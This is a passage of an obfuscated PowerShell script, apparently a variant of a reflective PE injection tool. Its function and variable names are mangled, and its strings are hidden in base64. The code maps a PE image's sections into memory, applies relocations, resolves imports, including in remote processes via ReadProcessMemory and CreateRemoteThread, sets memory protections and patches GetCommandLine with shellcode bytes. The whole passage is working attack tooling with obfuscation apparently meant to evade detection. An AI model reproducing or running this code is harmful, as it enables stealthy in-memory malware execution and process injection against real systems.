			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
		}
		${________/\_/\__/=} = _/=\/=\____/\____/ -_____/====\/\/==\_ ${_/==\_/\/=\/=\/=\_} -___/==\/\/\_______ ${/==\_/===\___/\/\} -Win32Functions$Win32Functions 
		${/====\___/\/=\/==} = $Win32Functions.WaitForSingleObject.Invoke(${________/\_/\__/=}, 20000)
		if (${/====\___/\/=\/==} -ne 0)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
		}
		[IntPtr]${/======\/\_/=\_/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/=\/==\____/==\_})
		${/====\___/\/=\/==} = $Win32Functions.ReadProcessMemory.Invoke(${_/==\_/\/=\/=\/=\_}, ${_/\/\/\__/\/===\/}, ${/======\/\_/=\_/=}, [UIntPtr][UInt64]${_/=\/==\____/==\_}, [Ref]${__/\/=\/\________})
		if ((${/====\___/\/=\/==} -eq $false) -or (${__/\/=\/\________} -eq 0))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
		}
		[IntPtr]${_/=\___/=\/=\____} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/======\/\_/=\_/=}, [Type][IntPtr])
		$Win32Functions.VirtualFreeEx.Invoke(${_/==\_/\/=\/=\/=\_}, ${/==\_/===\___/\/\}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke(${_/==\_/\/=\/=\/=\_}, ${/==\__/\/\/\_/=\/}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke(${_/==\_/\/=\/=\/=\_}, ${_/\/\/\__/\/===\/}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		return ${_/=\___/=\/=\____}
	}
	Function _/===\_/=\/\_/====
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		${_/=\_/\/\/=\___/=\},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${__/\/\_/\__/\___/=},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		for( ${/===\_/==\_/\/===} = 0; ${/===\_/==\_/\/===} -lt ${__/\/\_/\__/\___/=}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${/===\_/==\_/\/===}++)
		{
			[IntPtr]${___/\__/\/\/\/==\} = [IntPtr](_/=\/=\_/\/=\_/=== ([Int64]${__/\/\_/\__/\___/=}.SectionHeaderPtr) (${/===\_/==\_/\/===} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			${_______/===\/=\/\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${___/\__/\/\/\/==\}, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]${/=\/\__/==\___/\/} = [IntPtr](_/=\/=\_/\/=\_/=== ([Int64]${__/\/\_/\__/\___/=}.PEHandle) ([Int64]${_______/===\/=\/\}.VirtualAddress))
			${/===\/==\/\___/\_} = ${_______/===\/=\/\}.SizeOfRawData
			if (${_______/===\/=\/\}.PointerToRawData -eq 0)
			{
				${/===\/==\/\___/\_} = 0
			}
			if (${/===\/==\/\___/\_} -gt ${_______/===\/=\/\}.VirtualSize)
			{
				${/===\/==\/\___/\_} = ${_______/===\/=\/\}.VirtualSize
			}
			if (${/===\/==\/\___/\_} -gt 0)
			{
				_/\____/=\/\/\/\__ -____/\/\_/\/\/\/\_ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBhAHIAcwBoAGEAbABDAG8AcAB5AA=='))) -__/\/\_/\__/\___/= ${__/\/\_/\__/\___/=} -___/==\/\/\_______ ${/=\/\__/==\___/\/} -___/==\/===\/\_/=\ ${/===\/==\/\___/\_} | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy(${_/=\_/\/\/=\___/=\}, [Int32]${_______/===\/=\/\}.PointerToRawData, ${/=\/\__/==\___/\/}, ${/===\/==\/\___/\_})
			}
			if (${_______/===\/=\/\}.SizeOfRawData -lt ${_______/===\/=\/\}.VirtualSize)
			{
				${/=\/\_/\/====\___} = ${_______/===\/=\/\}.VirtualSize - ${/===\/==\/\___/\_}
				[IntPtr]${___/==\/\/\_______} = [IntPtr](_/=\/=\_/\/=\_/=== ([Int64]${/=\/\__/==\___/\/}) ([Int64]${/===\/==\/\___/\_}))
				_/\____/=\/\/\/\__ -____/\/\_/\/\/\/\_ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBlAG0AcwBlAHQA'))) -__/\/\_/\__/\___/= ${__/\/\_/\__/\___/=} -___/==\/\/\_______ ${___/==\/\/\_______} -___/==\/===\/\_/=\ ${/=\/\_/\/====\___} | Out-Null
				$Win32Functions.memset.Invoke(${___/==\/\/\_______}, 0, [IntPtr]${/=\/\_/\/====\___}) | Out-Null
			}
		}
	}
	Function __/=\__/\_/=\/\___
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${__/\/\_/\__/\___/=},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${_/=\_/\/\/\/=\__/\},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		[Int64]${_/\__/\/=\/\__/\_} = 0
		${_/\/\__/\/\_/==\/} = $true 
		[UInt32]${____/==\/==\__/\_} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		if ((${_/=\_/\/\/\/=\__/\} -eq [Int64]${__/\/\_/\__/\___/=}.EffectivePEHandle) `
				-or (${__/\/\_/\__/\___/=}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}
		elseif ((_/=\__/==\/=\_/\__ (${_/=\_/\/\/\/=\__/\}) (${__/\/\_/\__/\___/=}.EffectivePEHandle)) -eq $true)
		{
			${_/\__/\/=\/\__/\_} = __/\__/=\/===\/=== (${_/=\_/\/\/\/=\__/\}) (${__/\/\_/\__/\___/=}.EffectivePEHandle)
			${_/\/\__/\/\_/==\/} = $false
		}
		elseif ((_/=\__/==\/=\_/\__ (${__/\/\_/\__/\___/=}.EffectivePEHandle) (${_/=\_/\/\/\/=\__/\})) -eq $true)
		{
			${_/\__/\/=\/\__/\_} = __/\__/=\/===\/=== (${__/\/\_/\__/\___/=}.EffectivePEHandle) (${_/=\_/\/\/\/=\__/\})
		}
		[IntPtr]${___/===\_/==\_/\_} = [IntPtr](_/=\/=\_/\/=\_/=== ([Int64]${__/\/\_/\__/\___/=}.PEHandle) ([Int64]${__/\/\_/\__/\___/=}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			${/=\__/\/\__/==\/\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${___/===\_/==\_/\_}, [Type]$Win32Types.IMAGE_BASE_RELOCATION)
			if (${/=\__/\/\__/==\/\}.SizeOfBlock -eq 0)
			{
				break
			}
			[IntPtr]${_/\_/=\_/\_/==\/\} = [IntPtr](_/=\/=\_/\/=\_/=== ([Int64]${__/\/\_/\__/\___/=}.PEHandle) ([Int64]${/=\__/\/\__/==\/\}.VirtualAddress))
			${/=\_/=\/\/=====\_} = (${/=\__/\/\__/==\/\}.SizeOfBlock - ${____/==\/==\__/\_}) / 2
			for(${/===\_/==\_/\/===} = 0; ${/===\_/==\_/\/===} -lt ${/=\_/=\/\/=====\_}; ${/===\_/==\_/\/===}++)
			{
				${/=\_/==\_/\/===\/} = [IntPtr](_/=\/=\_/\/=\_/=== ([IntPtr]${___/===\_/==\_/\_}) ([Int64]${____/==\/==\__/\_} + (2 * ${/===\_/==\_/\/===})))
				[UInt16]${___/=====\/====\_} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=\_/==\_/\/===\/}, [Type][UInt16])
				[UInt16]${/=\_/\/\_/==\___/} = ${___/=====\/====\_} -band 0x0FFF
				[UInt16]${_/\_/\_/\_/\/=\/\} = ${___/=====\/====\_} -band 0xF000
				for (${___/\__/=\/\_/\_/} = 0; ${___/\__/=\/\_/\_/} -lt 12; ${___/\__/=\/\_/\_/}++)
				{
					${_/\_/\_/\_/\/=\/\} = [Math]::Floor(${_/\_/\_/\_/\/=\/\} / 2)
				}
				if ((${_/\_/\_/\_/\/=\/\} -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or (${_/\_/\_/\_/\/=\/\} -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					[IntPtr]${__/\__/=\_/==\/\/} = [IntPtr](_/=\/=\_/\/=\_/=== ([Int64]${_/\_/=\_/\_/==\/\}) ([Int64]${/=\_/\/\_/==\___/}))
					[IntPtr]${____/\_/\/=\_/===} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/\__/=\_/==\/\/}, [Type][IntPtr])
					if (${_/\/\__/\/\_/==\/} -eq $true)
					{
						[IntPtr]${____/\_/\/=\_/===} = [IntPtr](_/=\/=\_/\/=\_/=== ([Int64]${____/\_/\/=\_/===}) (${_/\__/\/=\/\__/\_}))
					}
					else
					{
						[IntPtr]${____/\_/\/=\_/===} = [IntPtr](__/\__/=\/===\/=== ([Int64]${____/\_/\/=\_/===}) (${_/\__/\/=\/\__/\_}))
					}				
					[System.Runtime.InteropServices.Marshal]::StructureToPtr(${____/\_/\/=\_/===}, ${__/\__/=\_/==\/\/}, $false) | Out-Null
				}
				elseif (${_/\_/\_/\_/\/=\/\} -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAgAHIAZQBsAG8AYwBhAHQAaQBvAG4AIABmAG8AdQBuAGQALAAgAHIAZQBsAG8AYwBhAHQAaQBvAG4AIAB2AGEAbAB1AGUAOgAgACQAewBfAC8AXABfAC8AXABfAC8AXABfAC8AXAAvAD0AXAAvAFwAfQAsACAAcgBlAGwAbwBjAGEAdABpAG8AbgBpAG4AZgBvADoAIAAkAHsAXwBfAF8ALwA9AD0APQA9AD0AXAAvAD0APQA9AD0AXABfAH0A')))
				}
			}
			${___/===\_/==\_/\_} = [IntPtr](_/=\/=\_/\/=\_/=== ([Int64]${___/===\_/==\_/\_}) ([Int64]${/=\__/\/\__/==\/\}.SizeOfBlock))
		}
	}
	Function __/=\_/\/\/==\_/\/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${__/\/\_/\__/\___/=},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		${_/==\_/\/=\/=\/=\_}
		)
		${/=\__/=\/==\__/==} = $false
		if (${__/\/\_/\__/\___/=}.PEHandle -ne ${__/\/\_/\__/\___/=}.EffectivePEHandle)
		{
			${/=\__/=\/==\__/==} = $true
		}
		if (${__/\/\_/\__/\___/=}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${_/\__/=\_/\/=\/\_} = _/=\/=\_/\/=\_/=== ([Int64]${__/\/\_/\__/\___/=}.PEHandle) ([Int64]${__/\/\_/\__/\___/=}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${__/\/\/\_/\_/\_/\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/\__/=\_/\/=\/\_}, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				if (${__/\/\/\_/\_/\_/\}.Characteristics -eq 0 `
						-and ${__/\/\/\_/\_/\_/\}.FirstThunk -eq 0 `
						-and ${__/\/\/\_/\_/\_/\}.ForwarderChain -eq 0 `
						-and ${__/\/\/\_/\_/\_/\}.Name -eq 0 `
						-and ${__/\/\/\_/\_/\_/\}.TimeDateStamp -eq 0)
				{
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAGkAbQBwAG8AcgB0AGkAbgBnACAARABMAEwAIABpAG0AcABvAHIAdABzAA==')))
					break
				}
				${___/\/\__/=\/\/==} = [IntPtr]::Zero
				${__/==\_/\/\____/\/} = (_/=\/=\_/\/=\_/=== ([Int64]${__/\/\_/\__/\___/=}.PEHandle) ([Int64]${__/\/\/\_/\_/\_/\}.Name))
				${_/=\_/\_/=\/\_/=\} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${__/==\_/\/\____/\/})
				if (${/=\__/=\/==\__/==} -eq $true)
				{
					${___/\/\__/=\/\/==} = _/=\/\___/====\/== -_/==\_/\/=\/=\/=\_ ${_/==\_/\/=\/=\/=\_} -__/==\_/\/\____/\/ ${__/==\_/\/\____/\/}
				}
				else
				{
					${___/\/\__/=\/\/==} = $Win32Functions.LoadLibrary.Invoke(${_/=\_/\_/=\/\_/=\})
				}
				if ((${___/\/\__/=\/\/==} -eq $null) -or (${___/\/\__/=\/\/==} -eq [IntPtr]::Zero))
				{
					throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBtAHAAbwByAHQAaQBuAGcAIABEAEwATAAsACAARABMAEwATgBhAG0AZQA6ACAAJAB7AF8ALwA9AFwAXwAvAFwAXwAvAD0AXAAvAFwAXwAvAD0AXAB9AA==')))
				}
				[IntPtr]${/=\_/\/\_/\_/\__/} = _/=\/=\_/\/=\_/=== (${__/\/\_/\__/\___/=}.PEHandle) (${__/\/\/\_/\_/\_/\}.FirstThunk)
				[IntPtr]${__/\_/\/\__/=\/=\} = _/=\/=\_/\/=\_/=== (${__/\/\_/\__/\___/=}.PEHandle) (${__/\/\/\_/\_/\_/\}.Characteristics) 
				[IntPtr]${__/\__/\__/\/==\_} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/\_/\/\__/=\/=\}, [Type][IntPtr])
				while (${__/\__/\__/\/==\_} -ne [IntPtr]::Zero)
				{
					${_/=\/=\/\_/=\/===} = ''
					[IntPtr]${/=\____/\_/=\_/\/} = [IntPtr]::Zero
					if([Int64]${__/\__/\__/\/==\_} -lt 0)
					{
						${_/=\/=\/\_/=\/===} = [Int64]${__/\__/\__/\/==\_} -band 0xffff 
					}
					else
					{
						[IntPtr]${__/=\/\____/=\_/\} = _/=\/=\_/\/=\_/=== (${__/\/\_/\__/\___/=}.PEHandle) (${__/\__/\__/\/==\_})
						${__/=\/\____/=\_/\} = _/=\/=\_/\/=\_/=== ${__/=\/\____/=\_/\} ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						${_/=\/=\/\_/=\/===} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${__/=\/\____/=\_/\})
					}
					if (${/=\__/=\/==\__/==} -eq $true)
					{
						[IntPtr]${/=\____/\_/=\_/\/} = _/=\__/\/\_/\__/== -_/==\_/\/=\/=\/=\_ ${_/==\_/\/=\/=\/=\_} -_____/\/\/====\__/ ${___/\/\__/=\/\/==} -__/\___/\__/\__/=\ ${_/=\/=\/\_/=\/===}
					}
					else
					{
						if(${_/=\/=\/\_/=\/===} -is [string])
						{
						    [IntPtr]${/=\____/\_/=\_/\/} = $Win32Functions.GetProcAddress.Invoke(${___/\/\__/=\/\/==}, ${_/=\/=\/\_/=\/===})
						}
						else
						{
						    [IntPtr]${/=\____/\_/=\_/\/} = $Win32Functions.GetProcAddressOrdinal.Invoke(${___/\/\__/=\/\/==}, ${_/=\/=\/\_/=\/===})
						}
					}
					if (${/=\____/\_/=\_/\/} -eq $null -or ${/=\____/\_/=\_/\/} -eq [IntPtr]::Zero)
					{
						Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHcAIABmAHUAbgBjAHQAaQBvAG4AIAByAGUAZgBlAHIAZQBuAGMAZQAgAGkAcwAgAG4AdQBsAGwALAAgAHQAaABpAHMAIABpAHMAIABhAGwAbQBvAHMAdAAgAGMAZQByAHQAYQBpAG4AbAB5ACAAYQAgAGIAdQBnACAAaQBuACAAdABoAGkAcwAgAHMAYwByAGkAcAB0AC4AIABGAHUAbgBjAHQAaQBvAG4AOgAgACQAewBfAC8APQBcAC8APQBcAC8AXABfAC8APQBcAC8APQA9AD0AfQAuACAARABsAGwAOgAgACQAewBfAC8APQBcAF8ALwBcAF8ALwA9AFwALwBcAF8ALwA9AFwAfQA=')))
					}
					[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/=\____/\_/=\_/\/}, ${/=\_/\/\_/\_/\__/}, $false)
					${/=\_/\/\_/\_/\__/} = _/=\/=\_/\/=\_/=== ([Int64]${/=\_/\/\_/\_/\__/}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]${__/\_/\/\__/=\/=\} = _/=\/=\_/\/=\_/=== ([Int64]${__/\_/\/\__/=\/=\}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]${__/\__/\__/\/==\_} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/\_/\/\__/=\/=\}, [Type][IntPtr])
				}
				${_/\__/=\_/\/=\/\_} = _/=\/=\_/\/=\_/=== (${_/\__/=\_/\/=\/\_}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}
	Function ___/====\/==\/\_/\
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		${_/=\_/\_/\/=\/\/==}
		)
		${__/=====\/=\_/\/\} = 0x0
		if ((${_/=\_/\_/\/=\/\/==} -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if ((${_/=\_/\_/\/=\/\/==} -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if ((${_/=\_/\_/\/=\/\/==} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${__/=====\/=\_/\/\} = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					${__/=====\/=\_/\/\} = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if ((${_/=\_/\_/\/=\/\/==} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${__/=====\/=\_/\/\} = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					${__/=====\/=\_/\/\} = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if ((${_/=\_/\_/\/=\/\/==} -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if ((${_/=\_/\_/\/=\/\/==} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${__/=====\/=\_/\/\} = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					${__/=====\/=\_/\/\} = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if ((${_/=\_/\_/\/=\/\/==} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${__/=====\/=\_/\/\} = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					${__/=====\/=\_/\/\} = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		if ((${_/=\_/\_/\/=\/\/==} -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			${__/=====\/=\_/\/\} = ${__/=====\/=\_/\/\} -bor $Win32Constants.PAGE_NOCACHE
		}
		return ${__/=====\/=\_/\/\}
	}
	Function __/=====\__/\/==\_
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${__/\/\_/\__/\___/=},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		for( ${/===\_/==\_/\/===} = 0; ${/===\_/==\_/\/===} -lt ${__/\/\_/\__/\___/=}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${/===\_/==\_/\/===}++)
		{
			[IntPtr]${___/\__/\/\/\/==\} = [IntPtr](_/=\/=\_/\/=\_/=== ([Int64]${__/\/\_/\__/\___/=}.SectionHeaderPtr) (${/===\_/==\_/\/===} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			${_______/===\/=\/\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${___/\__/\/\/\/==\}, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]${/=====\/=\___/=\_} = _/=\/=\_/\/=\_/=== (${__/\/\_/\__/\___/=}.PEHandle) (${_______/===\/=\/\}.VirtualAddress)
			[UInt32]${___/\_/\/\/=\_/\/} = ___/====\/==\/\_/\ ${_______/===\/=\/\}.Characteristics
			[UInt32]${___/\___/===\/\__} = ${_______/===\/=\/\}.VirtualSize
			[UInt32]${___/\/\/=\/\_/\/\} = 0
			_/\____/=\/\/\/\__ -____/\/\_/\/\/\/\_ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUALQBNAGUAbQBvAHIAeQBQAHIAbwB0AGUAYwB0AGkAbwBuAEYAbABhAGcAcwA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0AA=='))) -__/\/\_/\__/\___/= ${__/\/\_/\__/\___/=} -___/==\/\/\_______ ${/=====\/=\___/=\_} -___/==\/===\/\_/=\ ${___/\___/===\/\__} | Out-Null
			${_/\/\__/\___/\___} = $Win32Functions.VirtualProtect.Invoke(${/=====\/=\___/=\_}, ${___/\___/===\/\__}, ${___/\_/\/\/=\_/\/}, [Ref]${___/\/\/=\/\_/\/\})
			if (${_/\/\__/\___/\___} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGgAYQBuAGcAZQAgAG0AZQBtAG8AcgB5ACAAcAByAG8AdABlAGMAdABpAG8AbgA=')))
			}
		}
	}
	Function _/====\___/\_/\/==
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${__/\/\_/\__/\___/=},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		${___/=\__/==\__/\__},
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		${___/\/\/==\/===\/=}
		)
		${/==\__/\____/=\/=} = @() 
		${_/=\/==\____/==\_} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]${___/\/\/=\/\_/\/\} = 0
		[IntPtr]${/=\_/===\/==\_/==} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		if (${/=\_/===\/==\_/==} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyACAAaABhAG4AZABsAGUAIABuAHUAbABsAA==')))
		}
		[IntPtr]${__/\/=\_/=\___/\_} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAuAGQAbABsAA=='))))
		if (${__/\/=\_/=\___/\_} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
		}
		${_/\__/\_/\/\/\/\_} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${___/=\__/==\__/\__})
		${/=\/\_/=\_/\_/=\_} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${___/=\__/==\__/\__})
		[IntPtr]${___/\____/=\_/===} = $Win32Functions.GetProcAddress.Invoke(${__/\/=\_/=\___/\_}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAEEA'))))
		[IntPtr]${/========\___/\/=} = $Win32Functions.GetProcAddress.Invoke(${__/\/=\_/=\___/\_}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAFcA'))))
		if (${___/\____/=\_/===} -eq [IntPtr]::Zero -or ${/========\___/\/=} -eq [IntPtr]::Zero)
		{
			throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlACAAcAB0AHIAIABuAHUAbABsAC4AIABHAGUAdABDAG8AbQBtAGEAbgBkAEwAaQBuAGUAQQA6ACAAJAB7AF8AXwBfAC8AXABfAF8AXwBfAC8APQBcAF8ALwA9AD0APQB9AC4AIABHAGUAdABDAG8AbQBtAGEAbgBkAEwAaQBuAGUAVwA6ACAAJAB7AC8APQA9AD0APQA9AD0APQA9AFwAXwBfAF8ALwBcAC8APQB9AA==')))
		}
		[Byte[]]${__/=\/\/\__/\__/=} = @()
		if (${_/=\/==\____/==\_} -eq 8)
		{
			${__/=\/\/\__/\__/=} += 0x48	
		}
		${__/=\/\/\__/\__/=} += 0xb8
		[Byte[]]${_/=\/\__/\__/\__/} = @(0xc3)
		${_/\/\_/====\__/=\} = ${__/=\/\/\__/\__/=}.Length + ${_/=\/==\____/==\_} + ${_/=\/\__/\__/\__/}.Length
		${__/\___/=\_/=\/==} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/\/\_/====\__/=\})
		${__/\___/\__/\__/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/\/\_/====\__/=\})
		$Win32Functions.memcpy.Invoke(${__/\___/=\_/=\/==}, ${___/\____/=\_/===}, [UInt64]${_/\/\_/====\__/=\}) | Out-Null
		$Win32Functions.memcpy.Invoke(${__/\___/\__/\__/=}, ${/========\___/\/=}, [UInt64]${_/\/\_/====\__/=\}) | Out-Null
		${/==\__/\____/=\/=} += ,(${___/\____/=\_/===}, ${__/\___/=\_/=\/==}, ${_/\/\_/====\__/=\})
		${/==\__/\____/=\/=} += ,(${/========\___/\/=}, ${__/\___/\__/\__/=}, ${_/\/\_/====\__/=\})
		[UInt32]${___/\/\/=\/\_/\/\} = 0
		${_/\/\__/\___/\___} = $Win32Functions.VirtualProtect.Invoke(${___/\____/=\_/===}, [UInt32]${_/\/\_/====\__/=\}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${___/\/\/=\/\_/\/\})
		if (${_/\/\__/\___/\___} = $false)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
		}
		${_/\/\__/=\__/=\__} = ${___/\____/=\_/===}
		__/\_/====\/==\/\_ -____/\___/\/===\/= ${__/=\/\/\__/\__/=} -___/==\/=\_/\_/\/\ ${_/\/\__/=\__/=\__}
		${_/\/\__/=\__/=\__} = _/=\/=\_/\/=\_/=== ${_/\/\__/=\__/=\__} (${__/=\/\/\__/\__/=}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/=\/\_/=\_/\_/=\_}, ${_/\/\__/=\__/=\__}, $false)
		${_/\/\__/=\__/=\__} = _/=\/=\_/\/=\_/=== ${_/\/\__/=\__/=\__} ${_/=\/==\____/==\_}
		__/\_/====\/==\/\_ -____/\___/\/===\/= ${_/=\/\__/\__/\__/} -___/==\/=\_/\_/\/\ ${_/\/\__/=\__/=\__}
		$Win32Functions.VirtualProtect.Invoke(${___/\____/=\_/===}, [UInt32]${_/\/\_/====\__/=\}, [UInt32]${___/\/\/=\/\_/\/\}, [Ref]${___/\/\/=\/\_/\/\}) | Out-Null
		[UInt32]${___/\/\/=\/\_/\/\} = 0
